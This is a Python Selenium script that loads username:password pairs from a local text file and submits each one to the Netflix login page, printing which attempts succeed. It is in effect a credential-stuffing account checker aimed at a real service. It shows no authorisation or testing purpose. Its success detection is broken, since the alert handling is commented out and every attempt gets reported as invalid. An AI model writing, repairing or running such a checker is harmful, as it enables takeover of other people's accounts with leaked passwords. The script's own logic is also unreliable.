import selenium
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException

driver = webdriver.Chrome("C:\Drivers\chromedriver_win32\chromedriver.exe")
driver.get("https://www.netflix.com/in/login")

#open file and read lines
file_to_login = open('C:\\Users\\avita\Desktop\\netflix_login.txt', 'r')
Lines = file_to_login.readlines()

#read string before and after : symbol
count=0
for line in Lines:
    count+=1

    #string before and after : symbol
    usrnm = line.partition(':')

    # click on button to login
    #driver.find_element_by_link_text('Login').click()

    # put username
    time.sleep(1)
    # driver.find_element_by_id('id_userLoginId').clear()
    # driver.find_element_by_id('id_userLoginId').send_keys(usrnm[0])

    driver.find_element_by_xpath('//*[@id="id_userLoginId"]').clear()
    driver.find_element_by_xpath('//*[@id="id_userLoginId"]').send_keys(usrnm[0])

    # put password
    time.sleep(1)
    driver.find_element_by_id('id_password').clear()
    driver.find_element_by_id('id_password').send_keys(usrnm[2])

    driver.find_element_by_class_name('btn-submit').click()

    try:
        # login credentials wrong then alert box is encountered
        # alert = driver.switch_to.alert
        # alert.accept()
        print("Attempt",count,":Invalid login credentials:", usrnm[0], "and", usrnm[2])

    except:
        # login credentials correct, no alert box, just naviagted to dashboard
        print("Attempt",count,":Logged in successful with following credentials:", usrnm[0], "and", usrnm[2])
        # driver.back()



# driver.find_element_by_id('id_userLoginId').send_keys()

time.sleep(10)
driver.quit()



